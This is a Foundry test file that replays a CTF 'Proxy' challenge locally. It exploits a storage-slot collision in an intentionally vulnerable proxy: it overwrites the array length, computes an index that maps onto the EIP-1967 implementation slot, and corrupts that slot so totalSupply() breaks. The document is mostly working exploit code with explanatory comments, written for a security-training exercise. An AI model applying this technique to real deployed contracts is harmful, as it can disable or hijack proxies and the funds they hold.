// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/Proxy/BucketsProxy.sol";

/// @title BucketsProxy storage-collision exploit reproduction
/// @notice MixBytes Farm CTF (2022-2023) - "Proxy" challenge, replayed locally
///         against a vm-managed chain since the original Goerli testnet is gone.
/// @dev Goal (per original README): make `Buckets(Proxy.address).totalSupply()`
///      break - i.e. force the proxy's delegatecall to fail/produce garbage.
/// @dev BucketsProxy.sol is an intentionally vulnerable / pre-written challenge
///      contract and is NOT modified by this test.
///
/// Vulnerability: storage slot collision between the proxy and its
/// implementation.
///   - `BucketsProxy` (the proxy) declares its own storage variable `salt` at
///     slot 0, writable by anyone via `setFailsafeAdmin(uint256)`.
///   - `Buckets` (the implementation, reached via delegatecall) declares
///     `uint256[] public buckets` as its first variable - also slot 0, but
///     here it holds the dynamic array's *length*.
///   - Writing to `salt` therefore overwrites `buckets.length` as seen through
///     the implementation, which (since it becomes `type(uint256).max`)
///     defeats Solidity's array bounds check entirely.
///   - A dynamic array based at slot 0 stores its elements starting at
///     `keccak256(uint256(0))`. By choosing `bucketNumber = EIP1967_SLOT -
///     keccak256(uint256(0))` and calling `deposit(bucketNumber)`, the
///     attacker makes `buckets[bucketNumber] += msg.value` write directly into
///     the EIP-1967 implementation slot, corrupting the stored implementation
///     address.
///   - Any subsequent call through the proxy (e.g. `totalSupply()`) now
///     delegatecalls into a corrupted, non-contract address. The EVM lets a
///     delegatecall into an address with no code "succeed" trivially with
///     empty return data; once the caller tries to ABI-decode that empty
///     data as the expected `uint256`, Solidity's return-data-length check
///     triggers an exceptional halt - i.e. `totalSupply()` is broken for
///     every caller from that point on.
contract ProxyTest is Test {
    // EIP-1967 implementation slot: bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    uint256 constant PREMINT = 1000e18;

    Buckets implementation;
    BucketsProxy proxy;
    address player;

    function setUp() public {
        player = makeAddr("player");

        // Deploy the implementation contract.
        implementation = new Buckets();

        // Deploy the proxy, which initializes the implementation with PREMINT
        // bucket tokens minted to the deployer (this test contract).
        proxy = new BucketsProxy(address(implementation), PREMINT);
    }

    function test_StorageCollisionBreaksTotalSupply() public {
        // --- Sanity check: totalSupply() works fine before the attack -----
        uint256 supplyBefore = Buckets(address(proxy)).totalSupply();
        console.log("=== Before attack ===");
        console.log("totalSupply()               :", supplyBefore);
        assertEq(supplyBefore, PREMINT, "totalSupply should equal premint before the attack");

        bytes32 implSlotBefore = vm.load(address(proxy), IMPLEMENTATION_SLOT);
        console.log("EIP-1967 impl slot (before) :", uint256(implSlotBefore));
        assertEq(
            address(uint160(uint256(implSlotBefore))),
            address(implementation),
            "impl slot must hold the real implementation address"
        );

        // --- Step 1: player (NOT the proxy admin) overwrites slot 0 --------
        // `setFailsafeAdmin` is deliberately callable by anyone and writes
        // straight into `salt`, which lives at proxy storage slot 0 - the
        // same slot the implementation uses for `buckets.length`.
        vm.prank(player);
        BucketsProxy(payable(address(proxy))).setFailsafeAdmin(type(uint256).max);

        console.log("=== After setFailsafeAdmin(type(uint256).max) ===");
        console.log("buckets.length is now effectively uint256.max, bounds check defeated");

        // --- Step 2: compute the array index landing on the impl slot ------
        // Elements of a dynamic array based at slot 0 live at
        // keccak256(uint256(0)) + index. We want that to equal
        // IMPLEMENTATION_SLOT, so:
        //   index = IMPLEMENTATION_SLOT - keccak256(uint256(0))
        uint256 slotZeroHash = uint256(keccak256(abi.encode(uint256(0))));
        uint256 index = uint256(IMPLEMENTATION_SLOT) - slotZeroHash;
        console.log("keccak256(uint256(0))        :", slotZeroHash);
        console.log("computed bucket index        :", index);

        // --- Step 3: deposit into that index, corrupting the impl slot -----
        // `deposit` does `buckets[bucketNumber] += msg.value`, which - thanks
        // to the collision above - is really a write to IMPLEMENTATION_SLOT.
        vm.deal(player, 1 wei);
        vm.prank(player);
        Buckets(address(proxy)).deposit{value: 1 wei}(index);

        bytes32 implSlotAfter = vm.load(address(proxy), IMPLEMENTATION_SLOT);
        console.log("=== After deposit(index) into the colliding slot ===");
        console.log("EIP-1967 impl slot (after)   :", uint256(implSlotAfter));

        assertEq(uint256(implSlotAfter), uint256(implSlotBefore) + 1, "implementation slot should have been incremented by 1 wei");
        assertTrue(
            address(uint160(uint256(implSlotAfter))) != address(implementation),
            "implementation address must now be corrupted"
        );

        // --- Step 4: totalSupply() now breaks --------------------------------
        // The corrupted slot no longer points at a contract, so any further
        // delegatecall through the proxy (including view calls) reverts.
        console.log("=== After attack: calling totalSupply() through the broken proxy ===");
        (bool success, bytes memory data) = address(proxy).staticcall(abi.encodeWithSignature("totalSupply()"));
        console.log("call success?", success);
        console.log("returndata length", data.length);
        if (data.length >= 32) {
            console.log("decoded totalSupply()", abi.decode(data, (uint256)));
        }

        // Make an *external* sub-call from this test to itself, so that when
        // the ABI decoder chokes on the corrupted / empty return data, the
        // resulting exceptional halt only unwinds that sub-call's frame -
        // which `vm.expectRevert()` can observe - instead of nuking the
        // whole test transaction.
        vm.expectRevert();
        this.callTotalSupplyAndDecode();

        console.log("totalSupply() broke as expected (challenge completed)");
    }

    /// @dev Helper making the actual decode-forcing call to Buckets.totalSupply()
    /// through the broken proxy, as a genuine external sub-call.
    function callTotalSupplyAndDecode() external view returns (uint256) {
        return Buckets(address(proxy)).totalSupply();
    }
}
